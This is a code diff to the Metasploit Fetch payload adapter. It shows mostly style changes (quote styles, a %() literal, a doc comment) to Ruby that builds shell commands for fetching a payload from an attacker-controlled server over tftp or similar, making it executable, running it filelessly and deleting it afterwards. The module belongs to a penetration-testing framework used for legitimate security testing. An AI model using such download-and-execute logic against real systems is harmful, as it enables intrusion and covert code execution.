@@ -363,7 +363,7 @@ module Msf::Payload::Adapter::Fetch
 
     if datastore['FETCH_FILELESS'] == 'shell-search'
       cmds = _generate_fileless_bash_search(get_file_cmd)
-      cmds << "if [ $FOUND -eq 0 ]"
+      cmds << 'if [ $FOUND -eq 0 ]'
       cmds << "; then f=#{_remote_destination_nix(failsafe: true)}; "
       cmds << get_file_cmd
       cmds << "; chmod +x #{_remote_destination_nix}"
@@ -372,7 +372,7 @@ module Msf::Payload::Adapter::Fetch
       if datastore['FETCH_DELETE']
         cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}; fi"
       else
-        cmds << "fi"
+        cmds << 'fi'
       end
 
       return cmds
@@ -494,7 +494,7 @@ module Msf::Payload::Adapter::Fetch
         if datastore['FETCH_FILELESS'] != 'none' && linux?
           get_file_cmd = "(echo binary ; echo get #{uri} $f ) | tftp #{srvhost}"
           return _generate_fileless_shell(get_file_cmd, module_info['AdaptedArch']) if datastore['FETCH_FILELESS'] == 'shell'
-          return %<#{_generate_fileless_bash_search(get_file_cmd)} if [ $FOUND -eq 0 ]; then #{tftp_fetch_and_exec} fi> if datastore['FETCH_FILELESS'] == 'shell-search'
+          return %(#{_generate_fileless_bash_search(get_file_cmd)} if [ $FOUND -eq 0 ]; then #{tftp_fetch_and_exec} fi) if datastore['FETCH_FILELESS'] == 'shell-search'
           return _generate_fileless_python(get_file_cmd) if datastore['FETCH_FILELESS'] == 'python3.8+'
         else
           fetch_command = tftp_fetch_and_exec
@@ -553,6 +553,7 @@ module Msf::Payload::Adapter::Fetch
 
   # Returns or memoizes the remote payload destination for POSIX targets.
   #
+  # @param failsafe [Boolean] The argument determining whether destination is used in fail-safe part of fetch fileless or not.
   # @return [String] The POSIX destination path or fileless placeholder.
   def _remote_destination_nix(failsafe: false)
     return @remote_destination_nix unless @remote_destination_nix.nil? || failsafe == true
